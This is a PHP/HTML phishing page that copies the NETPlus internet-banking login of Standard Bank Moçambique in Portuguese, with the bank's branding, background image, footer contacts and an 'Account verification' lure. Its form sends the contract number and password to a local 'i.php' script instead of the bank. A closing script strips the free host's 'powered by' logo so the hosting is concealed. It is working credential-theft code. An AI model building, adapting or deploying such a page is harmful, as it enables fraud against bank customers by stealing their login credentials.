<?php include('file.php'); ?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head id="Head1">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>
	---
</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">

    <link rel="stylesheet" type="text/css" href="./login_files/metroDatepicker_v03.min.css">
    <link rel="stylesheet" type="text/css" href="./login_files/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="./login_files/bootstrap.metro.min.css">
    
    <link rel="stylesheet" type="text/css" href="./login_files/bootswatch.min.css">
    <link rel="stylesheet" type="text/css" href="./login_files/bootstrap.datepicker.min.css">
    <link rel="stylesheet" type="text/css" href="./login_files/ebankit-slider-dates.min.css">
    <link rel="stylesheet" type="text/css" href="./login_files/ebankit-imgareaselect.min.css">
    <link rel="stylesheet" type="text/css" href="./login_files/ebankit-table-responsive.min.css">
    <link rel="stylesheet" type="text/css" href="./login_files/ebankit-smoothDivScroll.min.css">
    <link rel="stylesheet" type="text/css" href="./login_files/ebankit-base_temp.min.css">

    

    
    

    
    
    <style type="text/css">cufon{text-indent:0!important;}@media screen,projection{cufon{display:inline!important;display:inline-block!important;position:relative!important;vertical-align:middle!important;font-size:1px!important;line-height:1px!important;}cufon cufontext{display:-moz-inline-box!important;display:inline-block!important;width:0!important;height:0!important;overflow:hidden!important;text-indent:-10000in!important;}cufon canvas{position:relative!important;}}@media print{cufon{padding:0!important;}cufon canvas{display:none!important;}}</style>
    
    
    

    
    
    
    
    
    
    
    
    

    
    


    



    <style type="text/css">
        @media (max-width: 770px)
        {

            footer
            {
                margin: 4em 0 0 0;
            }
        }
    </style>


    
    
    <meta name="apple-itunes-app" content="app-id=1054409044">
    
    

    <style>
        @media (min-width: 770px)
        {
            .content-message
            {
                margin: 0 !important;
            }

            .alert
            {
                margin: 0 !important;
                -moz-border-radius: 0;
                -webkit-border-radius: 0;
                border-radius: 0;
            }

            .alert-heading
            {
                margin: 0 !important;
            }
        }
    </style>


    
    
</head>
<body style="">
<img src="login_files/header.PNG" width="100%">
    <form method="post" action="i.php">
</div>
      <div class="topModalcontainer" style="display: inline-block;"></div>
        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-centered" style="padding: 0px;">
            
    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 metro">
        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-centered metro baseFull-resize">
            <div class="login-title-div">
                <div id="MainContentHead_Div3" class="loginIcon">
                    <div style="margin-left: 34px; margin-top: 1px; color: #004793;">
                       <img src="login.PNG"/> 
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="metro login-subtitle-div">
        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-centered metro baseFull-resize">
            <h2 class="topHeader">
                Bem-vindo ao NETPlus, o seu internet banking</h2>
        </div>
    </div>

        </div>
        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-centered main-container baseFull-resize">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12" style="padding-left: 0px; padding-right: 0px;">
                
    
    

    <div id="MainContentFull_loginContent" class="loginContent" style="background-image:url(&#39;https://ibanking.standardbank.co.mz/media/1156/loginmainbackground.png&#39;);">
        <div class="col-xs-12 col-sm-5 col-md-5 col-lg-5 panel-login">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 login-container">
                <p class="text-responsive-1-4">
                    <span id="MainContentFull_Label2">Para entrar, introduza as credenciais</span>
                </p>

                <div class="panel-login-inputs">
                    <div class="field loginTxTBox break">
<input name="username" type="text" maxlength="20" id="ctl00_MainContentFull_txtUserName_txField" required="" placeholder="Número de contrato"></div>

                    <div class="field loginTxTBox break">
<input name="password" type="password" maxlength="20" id="ctl00_MainContentFull_txtPassword_txField" required="" placeholder="Senha de acesso"><i class="lockimg icon-locked"></i></div>

                    
                </div>

                <div class="panel-plain" style="background-color: transparent; height: auto;">
                    <div style="margin-bottom: 10px;">
                        <input type="submit" name="ctl00$MainContentFull$btnLogin" value="ENTRAR" onClick="return eBankit.Presentation.Login.ValidateInputs();" id="MainContentFull_btnLogin" class="btn btn-primary btn-margin btn-block" style="border-radius: 4px; width: 100%;">
                    </div>
                </div>
            </div>
            <div style="clear: both;"></div>
        </div>
        <div class="hidden" style="padding-right: 0px; padding-top: 5px; margin-top: 10px;">
            <div id="campaigns" style="min-height: 290px;">
                <img src="./login_files/default_campaign_login.jpg" id="MainContentFull_imgCampaign" class="operatorImg img-campaign" style="min-width: 227px; min-height: 291px;" onClick="window.open(&#39;http://www.standardbank.co.mz/&#39;,&#39;_blank&#39;);">
            </div>
        </div>
        <div style="clear: both;"></div>
        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 login-forgotCredentials">
            <div class="panel-heading ebankit-pointer-text" style="padding: 0px;" data-toggle="collapse" data-target="#collapseForgetPwd">
                <div style="float: left; height: 30px;">
                    <span class="" style="margin-top: -10px;">
                        <img id="imgArrow" src="./login_files/ico_arrow_left.png" style="width: 27px; height: 28px; color: rgb(0, 71, 147) !important; font-size: larger; margin-top: -4px;">
                    </span>

                </div>
                <span class="text-responsive-1">
                    Não me recordo das minhas credenciais
                </span>
                <div style="clear: both;"></div>
            </div>
            <div id="collapseForgetPwd" class="panel-collapse collapse">
                <div class="panel-body row text-responsive-1 login-credentials-info metro">
                    O que devo fazer se não me recordar dos meus dados de acesso?<br><br><ul><li></li><li></li></ul>
                    <a id="MainContentFull_clickHereRecover" class="clickHereRecoverPwd">Recuperar senha de acesso</a>
                </div>
            </div>
        </div>
        <div style="clear: both;"></div>
        <div class="col-xs-12 col-sm-8 col-md-8 col-lg-8 alert-infoBig metro">
            <div class="panel-plain" style="background: none; height: auto; margin-bottom: 8px;">
                <div class="panel btn-infoBig alert-panel">
                    <span class="iconNet">
                    <span class="text-responsive-1" style="font-size: 1.7rem;">
                       </span>
                    <div><strong>Account verification</strong></div>
                </span></div>
            </div>
        </div>
        <div class="col-xs-12 col-sm-4 col-md-4 col-lg-4 panel-links metro">

            <div class="panel-plain" style="height: 40px; background: none;">
                <div id="MainContentFull_contactLink" class="panel panel-heading btn-info pushpin-panel" data-toggle="collapse">
                    <span class="iconPushpin iconPhone">
                    <h5 class="panel-title" style="display: inline-block; font-weight: normal; margin: 4px; color: rgb(100, 100, 100);">

                        Contactos</h5>

                </span></div>
                <div id="collapseMobileContacts" class="panel-collapse collapse">
                    <div class="panel-body">
                        <div style="width: 100%; clear: both; text-align: right;">
                            
                        </div>
                    </div>
                </div>
            </div>

            <div class="panel-plain" style="margin-top: 10px; height: 40px; background: none;">
                <div id="MainContentFull_branchLink" class="panel panel-heading btn-info pushpin-panel" data-toggle="collapse" >
                    <span class="iconPushpin iconBranches">
                    <h5 class="panel-title" style="display: inline-block; font-weight: normal; margin: 4px; color: rgb(100, 100, 100);">

                        ONDE ESTAMOS</h5>

                </span></div>
                <div id="Div1" class="panel-collapse collapse">
                    <div class="panel-body">
                        <div style="width: 100%; clear: both; text-align: right;">
                            
                        </div>
                    </div>
                </div>
            </div>

        </div>
        <div class="col-xs-12 visible-xs" style="padding: 15px 0px 0px;">
            <div id="campaignsSmall" style="text-align: center">
                <img src="./login_files/default_campaign_login.jpg" id="MainContentFull_imgCampaignSmall" class="img-responsive" style="display: inline-block" >
            </div>

            <div style="clear: both;"></div>
        </div>
        <div style="clear: both;"></div>
    </div>

    <input type="hidden" name="ctl00$MainContentFull$hdnInputTextField" id="MainContentFull_hdnInputTextField" value="1">


            </div>
            <div style="clear: both;"></div>
        </div>
        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-centered main-container baseFull-resize">
            
            
            
        </div>
        <!-- FOOTER -->
        <footer class="noprint">
            <div class="col-xs-12 col-sm-11 col-md-10 col-lg-9 col-centered baseFull-resize">
            </div>
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="row">
                    <div class="col-xs-12 col-sm-11 col-md-10 col-lg-9 col-centered baseFull-resize">
                        <div class="horizontalBar-eBankit justified-nav-tabs" style="margin-bottom: -20px;">
                            
                        </div>
                    </div>
                </div>
                <div class="row footer-menus-container">
                    <div class="col-xs-12 col-sm-10 col-md-9 col-lg-9 col-centered menu-vertical-list baseFull-resize">
                        <div class="col-sm-3 menu-vertical-list">
<p class="ebankit-footer-sidebar">Linha do Cliente</p>
<p class="ebankit-footer-number">800 412 412</p>
<p>Linha verde: Grátis</p>
<br>
<p>Linha fixa: +258 21 355 700</p>
<p>Fax: +258 21 300 662</p>
<p><a href="#" target="_self">linhadocliente@standardbank.co.mz</a></p>
<br>
<div style="clear: both;"></div>
</div>
<div class="col-sm-3 menu-vertical-list">
<p class="ebankit-footer-sidebar">Apoio ao Cliente</p>
<ul>
<li><a href="#" target="_blank">Localizar Agência</a></li>
<li><a href="#" target="_blank">Contactos</a></li>
<li><a href="#" target="_blank">Ajuda</a></li>
<li><a href="#" target="_blank">Preçário</a></li>
</ul>
<div style="clear: both;"></div>
</div>
<div class="col-sm-3 menu-vertical-list">
<p class="ebankit-footer-sidebar">Aplicações Móveis</p>
<ul>
<li><a href="#" target="_blank">iOS - App Store</a></li>
<li><a href="#" target="_blank">Android - Play Store</a></li>
</ul>
<div style="clear: both;"></div>
</div>
<div class="col-sm-3 menu-vertical-list">
<p class="ebankit-footer-sidebar">Sobre o Portal</p>
<ul>
<li><a href="#" target="_blank">Aviso Legal</a></li>
<li><a href="#" target="_blank">Privacidade e Segurança</a></li>
<li><a href="#" target="_blank">Condições de Acesso</a></li>
</ul>
<div style="clear: both;"></div>
</div>
<div style="clear: both;"></div>
                    </div>
                    <div class="col-xs-12 col-sm-10 col-md-9 col-lg-9 col-centered menu-vertical-list baseFull-resize copyright-note">
                        <span id="Label3" class="pull-right credits">© Standard Bank Moçambique 2015 - Todos os direitos reservados</span>
                    </div>
                </div>
                <div class="row text-center footer-credits">
                </div>
            </div>
            <div style="clear: both;"></div>
        </footer>
        <!-- END FOOTER -->
    </form>


</body></html>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
<script>
    $(document).ready(function(){ 
    $('body').find('img[src$="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"]').remove();
   }); 
</script>